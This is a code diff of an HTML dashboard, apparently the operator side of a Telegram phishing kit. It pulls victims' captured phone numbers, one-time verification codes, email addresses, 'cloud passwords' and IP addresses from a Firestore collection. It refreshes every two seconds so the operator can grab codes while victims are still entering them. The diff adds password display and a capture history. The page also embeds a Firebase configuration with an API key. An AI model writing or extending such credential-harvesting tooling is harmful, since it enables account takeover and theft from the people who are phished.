@@ -3,13 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login Data</title>
+    <title>Login Data Tracker</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Add Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <style>
-        /* Your existing CSS styles remain the same */
         * {
             margin: 0;
             padding: 0;
@@ -31,7 +30,7 @@
             border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
             width: 100%;
-            max-width: 600px;
+            max-width: 700px;
             padding: 40px 30px;
             text-align: center;
         }
@@ -44,7 +43,26 @@
         .data-header i {
             font-size: 48px;
             margin-bottom: 15px;
-            color: #0088cc;
+        }
+
+        .platform-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+            text-transform: uppercase;
+        }
+
+        .badge-telegram {
+            background: #0088cc;
+            color: white;
+        }
+
+        .badge-cloud {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
         }
 
         .data-item {
@@ -53,8 +71,15 @@
             margin: 20px 0;
             border-radius: 10px;
             text-align: left;
-            border-left: 4px solid #0088cc;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .telegram-item {
+            border-left: 4px solid #0088cc;
+        }
+
+        .cloud-item {
+            border-left: 4px solid #667eea;
         }
 
         .data-label {
@@ -83,6 +108,18 @@
             margin: 10px 0;
             text-align: center;
             border: 2px dashed #0088cc;
+        }
+
+        .password-display {
+            font-family: monospace;
+            font-size: 20px;
+            background: #667eea;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            text-align: center;
+            border: 2px solid #5a6fd8;
         }
 
         .back-btn {
@@ -163,18 +200,74 @@
         .clear-btn:hover {
             background: #dc2626;
         }
+
+        .status-waiting {
+            background: #fff3cd;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            text-align: center;
+            border: 1px solid #ffeaa7;
+        }
+
+        .status-active {
+            background: #e3f2fd;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            text-align: center;
+            border: 1px solid #bbdefb;
+        }
+
+        .history-section {
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .history-title {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .history-item {
+            background: white;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border-left: 4px solid #ddd;
+            font-size: 14px;
+        }
+
+        .history-telegram {
+            border-left-color: #0088cc;
+        }
+
+        .history-cloud {
+            border-left-color: #667eea;
+        }
     </style>
 </head>
 <body>
     <div class="data-container">
         <div class="data-header">
-            <i class="fab fa-telegram"></i>
-            <h2>Telegram Login Data</h2>
-            <p>Captured login information from Telegram authentication</p>
+            <i class="fas fa-database"></i>
+            <h2>Login Data Tracker</h2>
+            <p>Captured authentication information from all platforms</p>
         </div>
         
         <div id="displayData">
             <!-- Data will be displayed here -->
+        </div>
+
+        <div class="history-section" id="historySection" style="display: none;">
+            <div class="history-title">
+                <i class="fas fa-history"></i> Recent Activity
+            </div>
+            <div id="historyData">
+                <!-- History data will be displayed here -->
+            </div>
         </div>
         
         <div class="data-actions">
@@ -186,176 +279,296 @@
     </div>
 
     <script>
-// Firebase configuration - USE SAME CONFIG AS ABOVE
-const firebaseConfig = {
-    apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
-    authDomain: "telegram-login-tracker.firebaseapp.com",
-    projectId: "telegram-login-tracker",
-    storageBucket: "telegram-login-tracker.firebasestorage.app",
-    messagingSenderId: "930264969410",
-    appId: "1:930264969410:web:e0bb1717d3ca76ce774b5b",
-    measurementId: "G-5760KLJZJS"
-  };
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
+            authDomain: "telegram-login-tracker.firebaseapp.com",
+            projectId: "telegram-login-tracker",
+            storageBucket: "telegram-login-tracker.firebasestorage.app",
+            messagingSenderId: "930264969410",
+            appId: "1:930264969410:web:e0bb1717d3ca76ce774b5b",
+            measurementId: "G-5760KLJZJS"
+        };
 
-// Initialize Firebase
-firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
-async function displayStoredData() {
-    const displayData = document.getElementById('displayData');
-    
-    try {
-        // Get data from Firebase
-        const snapshot = await db.collection('telegramLogins')
-            .orderBy('timestamp', 'desc')
-            .limit(1)
-            .get();
-        
-        if (!snapshot.empty) {
-            const latestDoc = snapshot.docs[0];
-            const data = latestDoc.data();
+        async function displayStoredData() {
+            const displayData = document.getElementById('displayData');
+            const historySection = document.getElementById('historySection');
             
-            if (data.status === 'waiting_for_code') {
-                showPhoneOnly(data, 'Firebase Data - Waiting for Code');
-            } else {
-                showFullData(data, 'Firebase Data (All Devices)');
-            }
-        } else {
-            // Fallback to local storage
-            const localData = localStorage.getItem('telegramLoginData');
-            if (localData) {
-                const data = JSON.parse(localData);
-                if (data.status === 'waiting_for_code') {
-                    showPhoneOnly(data, 'Local Data - Waiting for Code');
+            try {
+                // Get latest data from Firebase
+                const snapshot = await db.collection('telegramLogins')
+                    .orderBy('timestamp', 'desc')
+                    .limit(5)
+                    .get();
+                
+                if (!snapshot.empty) {
+                    const allData = [];
+                    snapshot.forEach(doc => {
+                        allData.push(doc.data());
+                    });
+                    
+                    const latestData = allData[0];
+                    
+                    // Show latest data
+                    if (latestData.type === 'cloud_verification') {
+                        showCloudData(latestData, 'Firebase Data - Cloud Verification');
+                    } else if (latestData.status === 'waiting_for_code') {
+                        showPhoneOnly(latestData, 'Firebase Data - Waiting for Code');
+                    } else if (latestData.code) {
+                        showFullTelegramData(latestData, 'Firebase Data - Telegram Complete');
+                    } else {
+                        showBasicData(latestData, 'Firebase Data');
+                    }
+                    
+                    // Show history if there are multiple entries
+                    if (allData.length > 1) {
+                        showHistory(allData.slice(1));
+                        historySection.style.display = 'block';
+                    } else {
+                        historySection.style.display = 'none';
+                    }
+                    
                 } else {
-                    showFullData(data, 'Local Data (This device only)');
+                    // Fallback to local storage
+                    const localData = localStorage.getItem('telegramLoginData');
+                    if (localData) {
+                        const data = JSON.parse(localData);
+                        if (data.type === 'cloud_verification') {
+                            showCloudData(data, 'Local Data - Cloud Verification');
+                        } else if (data.status === 'waiting_for_code') {
+                            showPhoneOnly(data, 'Local Data - Waiting for Code');
+                        } else if (data.code) {
+                            showFullTelegramData(data, 'Local Data - Telegram Complete');
+                        } else {
+                            showBasicData(data, 'Local Data');
+                        }
+                    } else {
+                        showNoData();
+                    }
+                    historySection.style.display = 'none';
                 }
-            } else {
-                showNoData();
+                
+            } catch (error) {
+                console.error('Error loading Firebase data:', error);
+                // Fallback to local storage
+                const localData = localStorage.getItem('telegramLoginData');
+                if (localData) {
+                    const data = JSON.parse(localData);
+                    if (data.type === 'cloud_verification') {
+                        showCloudData(data, 'Local Data - Cloud Verification');
+                    } else if (data.status === 'waiting_for_code') {
+                        showPhoneOnly(data, 'Local Data - Waiting for Code');
+                    } else if (data.code) {
+                        showFullTelegramData(data, 'Local Data - Telegram Complete');
+                    } else {
+                        showBasicData(data, 'Local Data');
+                    }
+                } else {
+                    showNoData();
+                }
+                historySection.style.display = 'none';
             }
         }
-        
-    } catch (error) {
-        console.error('Error loading Firebase data:', error);
-        // Fallback to local storage
-        const localData = localStorage.getItem('telegramLoginData');
-        if (localData) {
-            const data = JSON.parse(localData);
-            if (data.status === 'waiting_for_code') {
-                showPhoneOnly(data, 'Local Data - Waiting for Code');
-            } else {
-                showFullData(data, 'Local Data (Firebase unavailable)');
-            }
-        } else {
-            showNoData();
+
+        function showPhoneOnly(data, source) {
+            const displayData = document.getElementById('displayData');
+            displayData.innerHTML = `
+                <div class="status-waiting">
+                    <strong>🕒 Status:</strong> ${source}
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">Platform <span class="platform-badge badge-telegram">Telegram</span></span>
+                    <span class="data-value">${data.platform || 'Telegram'}</span>
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">Phone Number</span>
+                    <span class="data-value" style="color: #0088cc; font-weight: bold; font-size: 20px;">${data.phone || 'Not provided'}</span>
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">Status</span>
+                    <span class="data-value" style="color: #f59e0b; font-weight: bold;">⏳ Waiting for verification code...</span>
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">IP Address</span>
+                    <span class="data-value">${data.ip || 'Unknown'}</span>
+                </div>
+                <div class="timestamp">
+                    Phone number submitted: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
+                </div>
+                <div style="background: #e3f2fd; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center;">
+                    <p style="margin: 0; color: #0088cc; font-weight: 500;">
+                        🔄 The user is currently entering the verification code...
+                    </p>
+                </div>
+            `;
         }
-    }
-}
 
-function showPhoneOnly(data, source) {
-    const displayData = document.getElementById('displayData');
-    displayData.innerHTML = `
-        <div class="data-source" style="background: #fff3cd; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; border: 1px solid #ffeaa7;">
-            <strong>🕒 Status:</strong> ${source}
-        </div>
-        <div class="data-item">
-            <span class="data-label">Platform</span>
-            <span class="data-value">${data.platform || 'Telegram'}</span>
-        </div>
-        <div class="data-item">
-            <span class="data-label">Phone Number</span>
-            <span class="data-value" style="color: #0088cc; font-weight: bold; font-size: 20px;">${data.phone || 'Not provided'}</span>
-        </div>
-        <div class="data-item">
-            <span class="data-label">Status</span>
-            <span class="data-value" style="color: #f59e0b; font-weight: bold;">⏳ Waiting for verification code...</span>
-        </div>
-        <div class="data-item">
-            <span class="data-label">IP Address</span>
-            <span class="data-value">${data.ip || 'Unknown'}</span>
-        </div>
-        <div class="timestamp">
-            Phone number submitted: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
-        </div>
-        <div style="background: #e3f2fd; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center;">
-            <p style="margin: 0; color: #0088cc; font-weight: 500;">
-                🔄 The user is currently entering the verification code...
-            </p>
-        </div>
-    `;
-}
+        function showFullTelegramData(data, source) {
+            const displayData = document.getElementById('displayData');
+            displayData.innerHTML = `
+                <div class="status-active">
+                    <strong>✅ Complete:</strong> ${source}
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">Platform <span class="platform-badge badge-telegram">Telegram</span></span>
+                    <span class="data-value">${data.platform || 'Telegram'}</span>
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">Phone Number</span>
+                    <span class="data-value">${data.phone || 'Not provided'}</span>
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">Verification Code</span>
+                    <div class="code-display">${data.code || 'No code yet'}</div>
+                </div>
+                <div class="data-item telegram-item">
+                    <span class="data-label">IP Address</span>
+                    <span class="data-value">${data.ip || 'Unknown'}</span>
+                </div>
+                <div class="timestamp">
+                    Completed: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
+                </div>
+            `;
+        }
 
-function showFullData(data, source) {
-    const displayData = document.getElementById('displayData');
-    displayData.innerHTML = `
-        <div class="data-source" style="background: #e3f2fd; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center;">
-            <strong>Data Source:</strong> ${source}
-        </div>
-        <div class="data-item">
-            <span class="data-label">Platform</span>
-            <span class="data-value">${data.platform || 'Telegram'}</span>
-        </div>
-        <div class="data-item">
-            <span class="data-label">Phone Number</span>
-            <span class="data-value">${data.phone || 'Not provided'}</span>
-        </div>
-        <div class="data-item">
-            <span class="data-label">Verification Code</span>
-            <div class="code-display">${data.code || 'No code yet'}</div>
-        </div>
-        <div class="data-item">
-            <span class="data-label">IP Address</span>
-            <span class="data-value">${data.ip || 'Unknown'}</span>
-        </div>
-        <div class="timestamp">
-            Last updated: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
-        </div>
-    `;
-}
+        function showCloudData(data, source) {
+            const displayData = document.getElementById('displayData');
+            displayData.innerHTML = `
+                <div class="status-active">
+                    <strong>☁️ Cloud Verification:</strong> ${source}
+                </div>
+                <div class="data-item cloud-item">
+                    <span class="data-label">Platform <span class="platform-badge badge-cloud">Cloud</span></span>
+                    <span class="data-value">${data.platform || 'Cloud Password'}</span>
+                </div>
+                <div class="data-item cloud-item">
+                    <span class="data-label">Email Address</span>
+                    <span class="data-value" style="color: #667eea; font-weight: bold;">${data.email || 'Not provided'}</span>
+                </div>
+                <div class="data-item cloud-item">
+                    <span class="data-label">Cloud Password</span>
+                    <div class="password-display">${data.password || 'No password'}</div>
+                </div>
+                <div class="data-item cloud-item">
+                    <span class="data-label">IP Address</span>
+                    <span class="data-value">${data.ip || 'Unknown'}</span>
+                </div>
+                <div class="timestamp">
+                    Cloud verification: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
+                </div>
+            `;
+        }
 
-function showNoData() {
-    const displayData = document.getElementById('displayData');
-    displayData.innerHTML = `
-        <div class="no-data">
-            <i class="fas fa-inbox"></i>
-            <h3>No Data Available</h3>
-            <p>No Telegram login data has been captured yet.</p>
-            <p>Complete the Telegram login process to see data here.</p>
-        </div>
-    `;
-}
+        function showBasicData(data, source) {
+            const displayData = document.getElementById('displayData');
+            displayData.innerHTML = `
+                <div class="status-active">
+                    <strong>📊 Data:</strong> ${source}
+                </div>
+                <div class="data-item">
+                    <span class="data-label">Platform</span>
+                    <span class="data-value">${data.platform || 'Unknown'}</span>
+                </div>
+                ${data.phone ? `
+                <div class="data-item">
+                    <span class="data-label">Phone Number</span>
+                    <span class="data-value">${data.phone}</span>
+                </div>
+                ` : ''}
+                ${data.email ? `
+                <div class="data-item">
+                    <span class="data-label">Email Address</span>
+                    <span class="data-value">${data.email}</span>
+                </div>
+                ` : ''}
+                <div class="data-item">
+                    <span class="data-label">IP Address</span>
+                    <span class="data-value">${data.ip || 'Unknown'}</span>
+                </div>
+                <div class="timestamp">
+                    Recorded: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}
+                </div>
+            `;
+        }
 
-// Display data when page loads
-displayStoredData();
+        function showHistory(historyData) {
+            const historyElement = document.getElementById('historyData');
+            let historyHTML = '';
+            
+            historyData.forEach((data, index) => {
+                const platform = data.platform || 'Unknown';
+                const time = data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : 'Unknown';
+                const type = data.type === 'cloud_verification' ? 'history-cloud' : 'history-telegram';
+                
+                let content = '';
+                if (data.phone) {
+                    content = `Phone: ${data.phone}`;
+                } else if (data.email) {
+                    content = `Email: ${data.email}`;
+                }
+                
+                if (data.code) {
+                    content += ` | Code: ${data.code}`;
+                }
+                
+                historyHTML += `
+                    <div class="history-item ${type}">
+                        <strong>${platform}</strong> - ${time}<br>
+                        <span style="color: #666; font-size: 12px;">${content}</span>
+                    </div>
+                `;
+            });
+            
+            historyElement.innerHTML = historyHTML;
+        }
 
-// Refresh button functionality
-document.getElementById('refreshBtn').addEventListener('click', function(e) {
-    e.preventDefault();
-    displayStoredData();
-    
-    const originalText = this.textContent;
-    this.textContent = 'Refreshing...';
-    setTimeout(() => {
-        this.textContent = originalText;
-    }, 1500);
-});
+        function showNoData() {
+            const displayData = document.getElementById('displayData');
+            displayData.innerHTML = `
+                <div class="no-data">
+                    <i class="fas fa-inbox"></i>
+                    <h3>No Data Available</h3>
+                    <p>No login data has been captured yet.</p>
+                    <p>Complete a login process to see data here.</p>
+                </div>
+            `;
+        }
 
-// Clear data button functionality
-document.getElementById('clearBtn').addEventListener('click', function() {
-    if (confirm('Are you sure you want to clear local data?')) {
-        localStorage.removeItem('telegramLoginData');
-        sessionStorage.removeItem('telegramLoginData');
+        // Display data when page loads
         displayStoredData();
-        
-        this.textContent = 'Local Data Cleared!';
-        setTimeout(() => {
-            this.textContent = 'Clear Local Data';
-        }, 1500);
-    }
-});
 
-// Auto-refresh every 2 seconds for real-time updates
-setInterval(displayStoredData, 2000);
-</script>
+        // Refresh button functionality
+        document.getElementById('refreshBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            displayStoredData();
+            
+            const originalText = this.textContent;
+            this.textContent = 'Refreshing...';
+            setTimeout(() => {
+                this.textContent = originalText;
+            }, 1500);
+        });
+
+        // Clear data button functionality
+        document.getElementById('clearBtn').addEventListener('click', function() {
+            if (confirm('Are you sure you want to clear local data?')) {
+                localStorage.removeItem('telegramLoginData');
+                sessionStorage.removeItem('telegramLoginData');
+                displayStoredData();
+                
+                this.textContent = 'Local Data Cleared!';
+                setTimeout(() => {
+                    this.textContent = 'Clear Local Data';
+                }, 1500);
+            }
+        });
+
+        // Auto-refresh every 2 seconds for real-time updates
+        setInterval(displayStoredData, 2000);
+    </script>
 </body>
 </html>
